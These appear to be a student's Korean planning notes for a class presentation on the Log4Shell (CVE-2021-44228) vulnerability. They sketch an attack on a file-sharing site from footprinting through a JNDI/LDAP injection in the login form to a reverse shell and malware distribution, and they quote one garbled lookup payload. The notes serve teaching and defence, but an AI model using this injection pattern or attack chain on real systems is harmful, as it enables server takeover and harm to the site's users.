1. 파일 공유 서비스가 존재한다. 이 서비스는 회원제로 운영된다.
2. 이 서비스는 로그인 시 사용자 계정명 및 파일 다운로드를 로그에 남긴다.
3. 공격자는 해당 서버에 풋프린팅을 통해 여러 정보를 얻어낸다.
이때 얻어내는 정보는 톰캣 웹서버라는 정보와 OS를 확인한다.
4. 공격자는 톰캣 웹서버를 쓴다는 것을 통해 현재 이 서비스는 자바기반 웹 백엔드 서비스라는것을 알아낼 수 있다.
5. 자바에서는 대부분의 로그를 slf4j를 이용하는데 이 때 slf4j라는 파사드 패턴으로 구현된 로그 추상체를 이용한다.
6. 이때 사용하는 로깅 프레임워크는 log4j, logback 등이 존재한다.
7. 공격자는 log4j의 사용 가능성을 인지하고, CVE-2021-44228, log4shell 취약점을 이용하기로 한다.
8. 보통 사용자 인증에 대해서는 대부분의 시스템이 로깅을 진행하는 바, 로그인 입력 폼에 악성 LDAP 서버로 연결되는 익스플로잇 코드를 삽입한다.
9. 시스템은 해당 정보를 로깅하는데, 이때 악성 LDAP서버로의 접근이 이루어지고 RCE 취약점이 실행된다.
10. 시스템에서 리버스 쉘을 통한 연결이 이루어진다.
11. 공격자는 서버의 권한을 탈취하여 여러 정보를 얻어낼 수 있다.

여기서 추가적으로 이행 가능한 공격
1. DB 털기
2. 서버 폭파
3. 파일공유서비스라는 점을 이용, 해당 서비스를 사용하는 사람들에게 악성 프로그램 유포
(이거도 유서깊은 공격인데, 비슷한 예시로 SK커뮤니케이션즈 네이트, 싸이월드에서 정보 털렸을때, 이스트소프트의 알약 패치 서버가 털려서 악성 프로그램이 유포된거다)
이를 교두보로 계속 공격을 연계할 수도 있을 것이다.



발표 구성
들어가야 하는거
1. 주제명
2. 선정이유 : 수업과의 관계성
3. 주요 과제 내용
4. 이를 탐지, 식별하는 방법
5. 대응 시나리오


slf4j랑 log4j가 무엇인가
JNDI랑 LDAP이 무엇인가?
여기서 이 에러가 왜 터지는가? ${} 이 문법 지원 때문에
왜 심각한가 ? 해커가 로그에 기록되는 곳을 찾아 ${jndi:sndi:snd://example.com/a}과 같은 값을 추가하기만 하면 취약점을 이용할 수 있기 때문에
왜 이주제를 선정했나?
상용 시스템에서 로깅을 안하는 경우는 없다고 봐도 무방하다. 나 군대에 있을때도 운영하는 시스템 로그가 달에 최소 100기가씩은 찍혔다.
근데 이 취약점은 그저 로깅을 수행하는것 만으로 취약점이 발생하는 매우 큰 문제를 가진다.
즉, 자바기반 시스템 중 log4j를 사용하는 대부분의 시스템이 이 공격 대상이라는 것이다.

만들거
1. 로그인 페이지
2. 메인페이지 (다운로드 가능한 파일 리스트)